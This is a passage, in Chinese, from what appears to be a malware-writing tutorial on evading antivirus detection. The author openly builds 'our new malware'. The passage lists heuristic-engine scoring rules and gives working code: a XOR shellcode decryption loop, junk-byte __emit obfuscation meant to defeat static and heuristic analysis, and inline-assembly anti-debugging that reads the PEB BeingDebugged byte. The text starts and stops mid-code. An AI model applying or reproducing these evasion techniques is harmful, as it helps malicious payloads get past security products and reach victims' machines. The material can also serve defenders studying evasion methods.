    unsigned char Key[] = {
      0x07, 0x25, 0x0f, 0x9e, 0xba, 0x42, 0x81, 0x1a
    };
因为我们正在写一个新的恶意软件，我们的恶意软件的哈希签名将不会被反病毒产品所知，所以我们不需要担心基于签名的检测，我们将加密我们的 `shellcode`
和混淆我们的反检测/反逆向的解密函数, 这是用于绕过静态/启发式分析阶段的方法。只有个阶段我们需要绕过，它是动态分析阶段，最重要的部分是 “AV检测”
功能的成功。开始编写函数之前，我们需要了解AV产品的启发式引擎是如何工作。
## 5 启发式引擎
启发式引擎基本上是基于统计和规则的分析机制。它们的主要目的是通过根据预定义标准对代码片段进行分类和提供威胁/风险等级来检测新一代（先前未知的）病毒，即使当由AV产品扫描简单的
`hello world` 程序时，启发式引擎决定威胁/风险分数该分数高于阈值，那么该文件被标记为恶意。
启发式引擎是他们使用大量规则和标准的AV产品的最先进的部分，因为没有反病毒公司发布蓝图或关于他们的启发式引擎的文档所有已知的威胁/风险分级政策的选择性标准被发现尝试和错误。
一些关于威胁分级的已知规则;
  * 检测到循环解密
  * 读取活动计算机名称
  * 读取加密机 GUID
  * 联系随机域名
  * 读取 Windows 安装日期
  * 删除可执行文件
  * 在二进制存储器中找到潜在的 IP 地址
  * 修改代理设置
  * 安装 HOOKS/PATCHES 正在运行的进程
  * 注入到 Explorer
  * 远程进程注入
  * 查询进程信息
  * 设置进程模式来压制弹出框
  * 特别熵
  * 可能检查防病毒引擎的存在
  * 监视特定的注册表项以进行更改
  * 包含提升权限的能力
  * 修改软件策略设置
  * 读取系统/视频 BIOS 版本
  * PE 头中的入口点在不常见的区段中
  * 创建保护的内存区域
  * 产生了很多进程
  * 设法休眠很长时间
  * 特殊的区段
  * 读取 Windows 产品 ID
  * 包含循环解密
  * 包含启动/交互设备驱动程序的能力
  * 包含阻止用户输入的能力
当我们写反AV检测和解密 `Shellcode` 的函数时，我们必须小心上面提到的所有规则。
### 5.1 解密 Shellcode
混淆解密机制是至关重要的，大多数AV启发式引擎能够检测 `PE`
文件中的解密循环，在勒索软件案例的成倍增加后，甚至一些启发式引擎主要仅用于查找加密/解密行为，在它们检测到解密行为 ，一些扫描器等待直到 `ECX`
寄存器大多数时间指示循环结束的 “0”，在它们到达解密循环的结束之后，它们将重新分析文件的解密内容。
这将是 “解密Shellcode” 函数:
    void DecryptShellcode() {
      for (int i = 0; i < sizeof(Shellcode); i++) {
        __asm
        {
          PUSH EAX
          XOR EAX, EAX
          JZ True1
          __asm __emit(0xca)
          __asm __emit(0x55)
          __asm __emit(0x78)
          __asm __emit(0x2c)
          __asm __emit(0x02)
          __asm __emit(0x9b)
          __asm __emit(0x6e)
          __asm __emit(0xe9)
          __asm __emit(0x3d)
          __asm __emit(0x6f)
          True1:
          POP EAX
        }
        Shellcode[i] = (Shellcode[i] ^ Key[(i % sizeof(Key))]);
        __asm
        {
          PUSH EAX
          XOR EAX, EAX
          JZ True2
          __asm __emit(0xd5)
          __asm __emit(0xb6)
          __asm __emit(0x43)
          __asm __emit(0x87)
          __asm __emit(0xde)
          __asm __emit(0x37)
          __asm __emit(0x24)
          __asm __emit(0xb0)
          __asm __emit(0x3d)
          __asm __emit(0xee)
          True2:
          POP EAX
        }
      }
    }
它是一个for循环，使得 `Shellcode` 字节和关键字节之间进行逻辑 `xor`
操作，下面和上面的汇编块字面上注释，它们覆盖了随机字节和跳过它们的逻辑 `xor` 操作。 因为我们没有使用任何高级解密机制，这将足以混淆“
解密Shellcode” 功能。
### 5.2 动态检测分析
写入沙盒检测机制时，我们需要混淆我们的方法，如果启发式引擎检测到任何反逆向工程方法的行为时，这将影响到恶意软件的威胁分数。
### 5.3 调试模式
我们的第一个AV检测机制将检查我们的进程中是否启用了调试器，有一个 `Windows API` 函数可以使用，它的主要工作是
“`确定是否调用进程正由用户模式调试器调试`“。但我们不会使用它，因为大多数AV产品都是监控 `Windows API`
调用的，他们可以使用逆向工程的方法来检测和处理。而不是使用 `Windows API` 函数，我们来看看 PEB(Process Environment
Block) 块中的 “BeingDebuged” 字节。
    // bool WINAPI IsDebuggerPresent(void);
    __asm
    {
    CheckDebugger:
      PUSH EAX              // Save the EAX value to stack
      MOV EAX, DWORD PTR FS : [0x18] // Get PEB structure address
      MOV EAX, DWORD PTR[EAX + 0x30] // Get being debugged byte
      CMP BYTE PTR[EAX + 2], 0      // Check if being debuged byte is set
      JNE CheckDebugger          // If debugger present check again
      POP EAX              // Put back the EAX value
    }
使用一些内联汇编这段代码指向 PEB 块中的 BeingDebuged
字节的指针，如果调试器存在，它将再次检查，直到堆栈中发生溢出，当溢出发生时，堆栈保护(stack canaries)将触发异常并且关闭进程，
这是退出程序的最短方法。
手动检查 BeingDebuged 字节将绕过大量的 AV 产品，但仍有一些AV产品已经能够对这种手段进行检测，所以我们需要混淆代码，以避免静态字符串分析。
    __asm
      {
      CheckDebugger:
        PUSH EAX
        MOV EAX, DWORD PTR FS : [0x18]
        __asm
        {
          PUSH EAX
          XOR EAX, EAX
          JZ J
          __asm __emit(0xea)
        J:
          POP EAX
        }
        MOV EAX, DWORD PTR[EAX + 0x30]
        __asm
        {
          PUSH EAX
          XOR EAX, EAX
          JZ J2
          __asm __emit(0xea)
        J2:
          POP EAX
        }
        CMP BYTE PTR[EAX + 2], 0
        __asm
        {
          PUSH EAX
          XOR EAX, EAX
          JZ J3
          __asm __emit(0xea)